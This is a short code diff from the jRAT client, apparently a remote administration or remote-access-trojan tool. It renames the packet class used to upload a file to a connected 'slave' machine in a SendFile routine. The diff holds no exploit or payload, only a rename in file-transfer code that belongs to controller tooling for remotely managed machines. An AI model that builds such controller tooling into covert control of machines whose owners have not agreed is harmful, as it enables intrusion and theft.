@@ -2,7 +2,7 @@ package se.jrat.client;
 
 import java.io.File;
 
-import se.jrat.client.packets.outgoing.Packet42TakeFile;
+import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
 import se.jrat.client.ui.frames.FrameFileTransfer;
 import se.jrat.client.ui.frames.FrameRemoteFiles;
 
@@ -22,7 +22,7 @@ public class SendFile {
 		}
 
 		try {
-			slave.addToSendQueue(new Packet42TakeFile(destdir, file.getName(), file));
+			slave.addToSendQueue(new Packet42ServerUploadFile(destdir, file.getName(), file));
 
 			if (frame != null) {
 				frame.done(file.getAbsolutePath(), file.length() + "");
